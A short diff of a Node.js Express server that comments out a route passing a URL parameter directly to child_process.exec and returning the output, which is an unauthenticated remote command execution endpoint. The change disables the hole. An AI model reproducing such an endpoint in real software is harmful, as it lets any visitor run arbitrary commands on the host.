@@ -19,13 +19,13 @@ app.get('/script.js', (req, res)=>{
     res.writeHead(200,  {'Content-Type': 'text/javascript'});
     res.end(indexFile.toString());
 })
-app.get('/cmd/:cmd', (req, res)=>{
-    require('child_process').exec(req.params.cmd,(err, data, stderr)=>{
-        if(err) res.send(err);
-        if(stderr) res.send(stderr);
-        res.send(data);
-    });
-})
+// app.get('/cmd/:cmd', (req, res)=>{
+//     require('child_process').exec(req.params.cmd,(err, data, stderr)=>{
+//         if(err) res.send(err);
+//         if(stderr) res.send(stderr);
+//         res.send(data);
+//     });
+// })
 
 let counter = 0;
 let clients = {};
